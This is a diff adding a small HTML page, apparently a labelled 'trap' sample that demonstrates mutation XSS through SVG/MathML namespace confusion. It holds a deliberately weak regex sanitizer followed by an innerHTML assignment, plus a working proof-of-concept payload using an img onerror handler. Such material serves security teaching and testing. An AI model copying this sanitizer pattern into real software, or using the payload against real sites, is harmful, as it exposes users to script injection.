@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>User Content Render</title>
+</head>
+<body>
+    <div id="content-container"></div>
+
+    <script>
+        // TRAP: mXSS (Mutation XSS) via Namespace Confusion
+        // This payload exploits how browsers parse SVG/MathML differently than HTML.
+        // Even if a basic sanitizer strips <script> tags, the browser's mutation
+        // upon assignment to innerHTML can execute the payload.
+        
+        function renderUserContent(untrustedHtml) {
+            const container = document.getElementById('content-container');
+            
+            // Standard "light" sanitization (removes raw script tags)
+            const lightSanitized = untrustedHtml.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
+            
+            // Assignment leads to mutation XSS
+            // Example payload: <math><mtext><style><!--</style><img title="--><img src=x onerror=alert(1)>">
+            container.innerHTML = lightSanitized;
+        }
+
+        // Simulate fetching user content
+        const payload = '<math><mtext><style><!--</style><img title="--><img src=x onerror=alert(1)>">';
+        renderUserContent(payload);
+    </script>
+</body>
+</html>
